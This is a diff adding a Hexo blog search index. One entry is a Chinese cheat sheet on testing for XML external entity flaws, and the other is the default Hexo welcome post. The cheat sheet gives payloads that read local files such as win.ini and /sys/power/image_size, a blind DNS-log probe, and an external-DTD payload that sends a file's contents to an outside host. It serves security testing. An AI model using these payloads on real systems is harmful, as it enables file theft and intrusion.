@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>xxe</title>
+    <url>/2019/12/02/xxe/</url>
+    <content><![CDATA[<h1 id="XXE小结"><a href="#XXE小结" class="headerlink" title="XXE小结"></a>XXE小结</h1><p><strong>1、测试是否禁用dtd</strong></p>
+<p><code>!DOCTYPE foo</code>  定义此文档是 foo类型的文档</p>
+<p><code>!ELEMENT foo ANY</code>  ANY 声明的元素，可包含任何可解析数据的组合 </p>
+<p><code>!ENTITY xxe &quot;testXXE&quot;</code>  !ENTITY 实体名称 “实体的值”</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>        </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY xxe "testXXE"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">] &gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>666<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/loading.gif" data-original="image-20191128170713993.png" alt="image-20191128170713993"></p>
+<p><strong>2、测试是否可回显本地文件</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span> </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">sys</span>/<span class="attr">power</span>/<span class="attr">image_size</span>"&gt;</span>   #payload：无特殊字符，返回只有一行数字</span></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/loading.gif" data-original="image-20191128171532350.png" alt="image-20191128171532350"></p>
+<p><strong>3、dnslog盲打</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用于快速发现是否存在xxe漏洞</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;        </span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ELEMENT foo ANY &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;xxe.test.log.a0xpg.com&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">] &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/loading.gif" data-original="image-20191128172004334.png" alt="image-20191128172004334"></p>
+<p><strong>4、外部dtd盲打</strong></p>
+<p>无回显盲打xxe，用于fileattack测试</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo SYSTEM "http://www.a0xpg.com/log.dtd"&gt;</span></span></pre></td></tr></table></figure>
+
+<p><code>注意</code>：特殊字符会破坏URL</p>
+<p><a href="http://www.a0xpg.com/log.dtd" target="_blank" rel="noopener">http://www.a0xpg.com/log.dtd</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;http:&#x2F;&#x2F;xxe.log.a0xpg.com&#x2F;x&#x3D;%payload;&quot;&gt;&#39;&gt; %param1; %external;</span></pre></td></tr></table></figure>
+
+
+
+<p><strong>5、支持的协议</strong></p>
+<p><img src="/images/loading.gif" data-original="image-20191128181129606.png" alt="image-20191128181129606"></p>
+<p><code>tips</code>: java中可以使用netdoc代替file</p>
+<p><strong>6、xxe利用</strong></p>
+<p>读取多行文件可以使用ftp服务器</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Hello Word - Hexo</title>
+    <url>/2019/05/26/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>tags:</p>
+<ul>
+<li>Web安全</li>
+</ul>
+]]></content>
+      <categories>
+        <category>测试</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>test</tag>
+      </tags>
+  </entry>
+</search>
